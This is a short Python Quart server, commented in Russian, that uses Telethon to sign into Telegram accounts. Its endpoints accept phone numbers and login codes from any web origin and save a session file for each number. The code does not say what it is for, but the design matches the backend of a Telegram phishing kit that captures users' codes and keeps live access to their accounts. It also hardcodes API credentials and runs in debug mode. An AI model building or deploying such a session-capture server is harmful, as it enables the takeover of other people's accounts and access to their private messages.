import asyncio
from quart import Quart, request, jsonify
from quart_cors import cors
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os

# --- Настройки ---
API_ID = 26595249  # Укажи свой API ID
API_HASH = "9480dce5299fb30b4e520242dd6d87d8"  # Укажи свой API Hash
SESSION_DIR = "sessions"  # Папка для хранения сессий

# Словарь для хранения phone_code_hash
phone_code_hashes = {}

# Создаем папку для сессий, если ее нет
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

app = Quart(__name__)
app = cors(app, allow_origin="*")

async def get_client(phone_number):
    """ Создает и возвращает TelegramClient для конкретного номера """
    session_path = os.path.join(SESSION_DIR, f"{phone_number}.session")
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    return client

@app.post("/send_phone")
async def send_phone():
    try:
        data = await request.json
        phone_number = data.get("phone")

        if not phone_number:
            return jsonify({"success": False, "error": "Номер телефона обязателен"}), 400

        client = await get_client(phone_number)

        if not await client.is_user_authorized():
            send_code = await client.send_code_request(phone_number)
            phone_code_hashes[phone_number] = send_code.phone_code_hash  # Сохраняем hash

        return jsonify({"success": True, "message": "Код отправлен"}), 200

    except Exception as e:
        print("Ошибка на сервере:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500

@app.post("/send_code")
async def send_code():
    try:
        data = await request.json
        phone_number = data.get("phone")
        code = data.get("code")

        if not phone_number or not code:
            return jsonify({"success": False, "error": "Номер и код обязательны"}), 400

        if phone_number not in phone_code_hashes:
            return jsonify({"success": False, "error": "Сначала запросите код"}), 400

        client = await get_client(phone_number)

        if not await client.is_user_authorized():
            phone_code_hash = phone_code_hashes.pop(phone_number)  # Получаем и удаляем hash
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)

        return jsonify({"success": True, "message": "Вход выполнен"}), 200

    except SessionPasswordNeededError:
        return jsonify({"success": False, "error": "Нужен пароль 2FA"}), 401
    except Exception as e:
        print("Ошибка на сервере:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == "__main__":
    print("🚀 Сервер запущен")
   
PORT = int(os.environ.get("PORT", 5701))  # Берем порт из окружения, иначе 5701
asyncio.run(app.run(host="0.0.0.0", port=PORT, debug=True))




